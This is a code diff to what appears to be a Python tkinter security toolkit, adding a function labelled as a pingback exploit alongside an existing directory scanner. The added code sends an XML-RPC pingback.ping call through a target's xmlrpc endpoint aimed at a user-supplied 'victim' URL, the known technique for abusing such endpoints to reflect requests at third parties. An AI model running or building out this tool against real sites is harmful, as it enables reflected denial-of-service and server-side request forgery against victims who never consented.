@@ -4,6 +4,25 @@ from tkinter import filedialog, messagebox
 import threading
 import requests
 import xmlrpc.client
+def run_pingback_exploit():
+    xmlrpc_url = exploit_target_entry.get().strip()
+    victim_url = exploit_victim_entry.get().strip()
+
+    if not xmlrpc_url or not victim_url:
+        messagebox.showerror("Error", "Fill in both target and victim URLs.")
+        return
+
+    exploit_output.delete("0.0", "end")
+    exploit_output.insert("end", f"[*] Sending pingback from {xmlrpc_url} to {victim_url}\n")
+
+    try:
+        proxy = xmlrpc.client.ServerProxy(xmlrpc_url)
+        result = proxy.pingback.ping(victim_url, xmlrpc_url)
+        exploit_output.insert("end", f"[+] Pingback response: {result}\n")
+    except xmlrpc.client.Fault as fault:
+        exploit_output.insert("end", f"[-] Fault: {fault.faultString}\n")
+    except Exception as e:
+        exploit_output.insert("end", f"[!] Error: {e}\n")
 def run_dir_scan():
     url = scanner_target_entry.get().strip().rstrip("/")
     if not url.startswith("http"):
